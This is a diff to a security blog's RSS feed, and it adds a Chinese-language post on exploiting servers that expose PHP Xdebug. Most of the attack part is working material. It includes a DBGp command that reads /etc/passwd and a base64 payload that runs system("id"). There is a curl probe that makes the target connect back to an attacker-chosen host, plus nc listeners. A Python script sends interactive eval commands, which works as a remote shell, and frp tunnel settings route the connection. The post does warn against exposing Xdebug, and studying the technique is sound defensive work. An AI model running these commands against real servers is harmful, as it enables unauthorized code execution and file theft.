@@ -1,4 +1,114 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Codiy's Notebook – Security</title><link>https://note.codiy.net/docs/security/</link><description>Recent content in Security on Codiy's Notebook</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://note.codiy.net/docs/security/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: Exploiting PHP deserialization And SSRF</title><link>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</link><pubDate>Sat, 27 Feb 2021 09:16:52 +0800</pubDate><guid>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</guid><description>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Codiy's Notebook – Security</title><link>https://note.codiy.net/docs/security/</link><description>Recent content in Security on Codiy's Notebook</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://note.codiy.net/docs/security/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: Php Xdebug</title><link>https://note.codiy.net/docs/2022/01/php-xdebug/</link><pubDate>Tue, 18 Jan 2022 10:41:58 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/php-xdebug/</guid><description>
+&lt;blockquote>
+&lt;p>温馨提示: &lt;strong>放置到公网的 PHP 环境，请务必关闭 Xdebug.&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="xdebug-调试-php">Xdebug 调试 PHP&lt;/h2>
+&lt;ul>
+&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#mode">&lt;code>xdbeug.mode&lt;/code>&lt;/a> 可设置 xdebug 开启的模式.&lt;/li>
+&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#start_with_request">&lt;code>xdebug.start_with_request&lt;/code>&lt;/a> 可通过设置请求参数 &lt;code>XDEBUG_SESSION_START=phpstrom&lt;/code> 或者设置环境变量
+&lt;code>XDEBUG_SESSION=1&lt;/code> 或者设置请求头信息 &lt;code>Cookie: XDEBUG_SESSION=start&lt;/code> 等方式开启 xdebug&lt;/li>
+&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#discover_client_host">&lt;code>xdebug.discover_client_host&lt;/code>&lt;/a>, 支持通过 &lt;code>X-Forwarded-For&lt;/code> 头信息获取调试客户端的地址&lt;/li>
+&lt;li>配置 &lt;code>xdebug.client_host&lt;/code>, &lt;code>xdebug.client_port&lt;/code> 指定调试客户端的地址和端口&lt;/li>
+&lt;li>Xdebug 支持 &lt;a href="https://xdebug.org/docs/dbgp">&lt;code>dbgp 调试协议&lt;/code>&lt;/a>, 可以用来进行&lt;strong>源码阅读&lt;/strong>, &lt;strong>执行 eval 指令&lt;/strong>, &lt;strong>开启交互式 shell&lt;/strong> 等危险操作&lt;/li>
+&lt;li>Xdebug 的一般配置&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#658b00">zend_extension&lt;/span>=&lt;span style="color:#cd5555">xdebug.so&lt;/span>
+&lt;span style="color:#8b008b;font-weight:bold">[xdebug]&lt;/span>
+&lt;span style="color:#658b00">xdebug.mode&lt;/span>=&lt;span style="color:#cd5555">debug&lt;/span>
+&lt;span style="color:#658b00">xdebug.start_with_request&lt;/span>=&lt;span style="color:#cd5555">trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set&lt;/span>
+&lt;span style="color:#658b00">xdebug.discover_client_host&lt;/span>=&lt;span style="color:#cd5555">yes&lt;/span>
+&lt;span style="color:#658b00">xdebug.client_host&lt;/span>=&lt;span style="color:#cd5555">host.docker.internal&lt;/span>
+&lt;span style="color:#658b00">xdebug.client_port&lt;/span>=&lt;span style="color:#cd5555">9000&lt;/span>
+&lt;span style="color:#658b00">xdebug.idekey&lt;/span>=&lt;span style="color:#cd5555">VSCODE&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="xdebug-dbgp-协议">Xdebug DBGp 协议&lt;/h2>
+&lt;p>通过阅读 &lt;a href="https://xdebug.org/docs/dbgp">DBGp&lt;/a> 的文档，我们可以注意到一些比较敏感的命令。&lt;/p>
+&lt;ul>
+&lt;li>Core Commands &amp;gt; source&lt;/li>
+&lt;li>Extended Commands &amp;gt; eval&lt;/li>
+&lt;li>Extended Commands &amp;gt; interact - Interactive Shell&lt;/li>
+&lt;li>Core Commands &amp;gt; property_set&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>1. &lt;code>source -i transaction_id -f FILE_URI&lt;/code>&lt;/strong>&lt;/p>
+&lt;p>&lt;code>transaction_id&lt;/code> 貌似没有那么硬性的要求，每次都为 1 即可 FILE_URI 是要读取的文件的路径，需要注意的是
+Xdebug 也受限于 &lt;code>open_basedir&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>source -i 1 -f file:///etc/passwd
+&lt;/code>&lt;/pre>&lt;p>此处也可以用 &lt;code>php://PHP_SCRIPT_LOCATION&lt;/code> 来读取文件, 因而也可能用来发起 &lt;strong>SSRF&lt;/strong> 攻击&lt;/p>
+&lt;p>&lt;strong>2. &lt;code>eval -i transaction_id -- {DATA}&lt;/code>&lt;/strong>&lt;/p>
+&lt;p>&lt;code>{DATA}&lt;/code> 为 base64 过的 PHP 代码。&lt;/p>
+&lt;p>&lt;strong>3. interact&lt;/strong>&lt;/p>
+&lt;p>暂未研究&lt;/p>
+&lt;p>&lt;strong>4. property_set&lt;/strong>&lt;/p>
+&lt;p>根据 Xdebug 实现的 dbgp 协议, property_set 存在一处执行 evel 命令的入口, 详见源码 &lt;a href="https://github.com/xdebug/xdebug/blob/master/src/debugger/handler_dbgp.c#L1628-L1630">handler_dbgp.c&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#228b22">/* Do the eval */&lt;/span>
+eval_string = xdebug_sprintf(&lt;span style="color:#cd5555">&amp;#34;%s = %s %s&amp;#34;&lt;/span>, CMD_OPTION_CHAR(&lt;span style="color:#cd5555">&amp;#39;n&amp;#39;&lt;/span>), cast_as, new_value);
+res = xdebug_do_eval(eval_string, &amp;amp;ret_zval);
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用方式:&lt;/p>
+&lt;pre tabindex="0">&lt;code>property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw==
+property_get -n $a -i 1 -c 1 -p 0
+&lt;/code>&lt;/pre>&lt;h2 id="服务器-xdebug-嗅探">服务器 Xdebug 嗅探&lt;/h2>
+&lt;p>通过一条 &lt;strong>CURL&lt;/strong> 指令即可嗅探目标服务器是否开启了 &lt;strong>Xdebug&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -v &lt;span style="color:#cd5555">&amp;#34;http://&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">TARGET_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">/?XDEBUG_SESSION_START=phpstrom&amp;#34;&lt;/span> &lt;span style="color:#cd5555">\
+&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;X-Forwarded-For: &lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">XDEBUG_CLIENT_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;Cookie: XDEBUG_SESSION=start&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>原理简介:&lt;/strong> 服务器端开启了 Xdebug 在收到请求时, 发现请求携带了 &lt;code>XDEBUG_SESSION_START&lt;/code> 参数或者 &lt;code>Cookie: XDEBUG_SESSION=start&lt;/code>
+头信息, 会尝试用 &lt;code>X-Forwarded-For&lt;/code> 所指定的地址作为 Xdebug 的远端(xdebug client), 向其发起连接, 连接的端口为 &lt;code>xdebug.client_port&lt;/code>
+设置的值.&lt;/p>
+&lt;h2 id="配置-xdebug-client">配置 Xdebug Client&lt;/h2>
+&lt;p>即用来与目标机器 xdebug 交互的 client.&lt;/p>
+&lt;h3 id="方式一-简单的通过-nc-命令-监听常见的-xdebug-client-端口-9000-9003">方式一: 简单的通过 &lt;strong>&lt;code>nc&lt;/code>&lt;/strong> 命令, 监听常见的 xdebug client 端口 &lt;strong>&lt;code>9000&lt;/code>&lt;/strong>, &lt;strong>&lt;code>9003&lt;/code>&lt;/strong>&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">nc -lvv &lt;span style="color:#b452cd">9000&lt;/span>
+nc -lvv &lt;span style="color:#b452cd">9003&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行 &lt;strong>CURL&lt;/strong> 嗅探请求, 当 &lt;strong>nc&lt;/strong> 回显出类似如下的 xml 文档，即说明目标机器 xdebug 处于可利用状态.
+&lt;p class="md__image">
+&lt;img
+src="https://img.codiy.net/uncataloged/2022-01/18131632.png"
+alt=""
+/>
+&lt;/p>&lt;/p>
+&lt;h3 id="方式二-利用脚本文件-实现当-xdebug-与-client-建立连接后-client-交互式的发送指令给目标机器">方式二: 利用脚本文件, 实现当 xdebug 与 client 建立连接后, client 交互式的发送指令给目标机器&lt;/h3>
+&lt;p>xdebug.py&lt;/p>
+&lt;pre tabindex="0">&lt;code>#!/usr/bin/python3
+import socket
+import base64
+ip_port = ('0.0.0.0',9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+while True:
+client_data = conn.recv(1024)
+print(&amp;quot;&amp;lt;&amp;lt;\n&amp;quot;)
+print(client_data)
+print(&amp;quot;\n&amp;quot;)
+data = input('&amp;gt;&amp;gt; ')
+data = base64.b64encode(data.encode('utf-8'))
+print('eval -i 1 -- %s\x00' % data.decode('utf-8'))
+conn.sendall(('eval -i 1 -- %s\x00' % data.decode('utf-8')).encode('utf-8'))
+&lt;/code>&lt;/pre>&lt;h3 id="利用-gofrp6-实现将本机作为-xdebug-client-方便调试">利用 &lt;strong>&lt;a href="https://github.com/fatedier/frp">gofrp&lt;/a>&lt;/strong> 实现将本机作为 &lt;strong>xdebug client&lt;/strong>, 方便调试&lt;/h3>
+&lt;p>frps.ini&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#228b22">; frps.ini&lt;/span>
+&lt;span style="color:#8b008b;font-weight:bold">[common]&lt;/span>
+&lt;span style="color:#658b00">bind_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
+&lt;span style="color:#658b00">kcp_bind_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
+&lt;span style="color:#658b00">token&lt;/span> = &lt;span style="color:#cd5555">whatthefuck&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>fprc.ini&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#228b22">; frpc.ini&lt;/span>
+&lt;span style="color:#8b008b;font-weight:bold">[common]&lt;/span>
+&lt;span style="color:#658b00">server_addr&lt;/span> = &lt;span style="color:#cd5555">xxx.xxx.xxx.xxx&lt;/span>
+&lt;span style="color:#658b00">server_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
+&lt;span style="color:#658b00">token&lt;/span> = &lt;span style="color:#cd5555">whatthefuck&lt;/span>
+&lt;span style="color:#8b008b;font-weight:bold">[tcp_9000]&lt;/span>
+&lt;span style="color:#658b00">type&lt;/span> = &lt;span style="color:#cd5555">tcp&lt;/span>
+&lt;span style="color:#658b00">local_port&lt;/span> = &lt;span style="color:#cd5555">9000&lt;/span>
+&lt;span style="color:#8b008b;font-weight:bold">[tcp_9003]&lt;/span>
+&lt;span style="color:#658b00">type&lt;/span> = &lt;span style="color:#cd5555">tcp&lt;/span>
+&lt;span style="color:#658b00">local_port&lt;/span> = &lt;span style="color:#cd5555">9003&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>运行命令启动 client&lt;/strong>&lt;/p>
+&lt;pre tabindex="0">&lt;code>python3 xdebug.py
+frpc -c ./frpc.ini
+&lt;/code>&lt;/pre>&lt;p>接着即可用 &lt;strong>CURL&lt;/strong> 嗅探指令来建立 xdebug 连接, 注意 &lt;code>X-Forwarded-For&lt;/code> 应当指定为 &lt;strong>frps&lt;/strong> 服务器地址&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -v &lt;span style="color:#cd5555">&amp;#34;http://&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">TARGET_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">/?XDEBUG_SESSION_START=phpstrom&amp;#34;&lt;/span> &lt;span style="color:#cd5555">\
+&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;X-Forwarded-For: &lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">FRPS_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;Cookie: XDEBUG_SESSION=start&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Docs: Exploiting PHP deserialization And SSRF</title><link>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</link><pubDate>Sat, 27 Feb 2021 09:16:52 +0800</pubDate><guid>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</guid><description>
 &lt;h2 id="1---反序列化利用链">1 - 反序列化利用链&lt;/h2>
 &lt;h3 id="11-基础知识和原理">1.1 基础知识和原理&lt;/h3>
 &lt;ul>
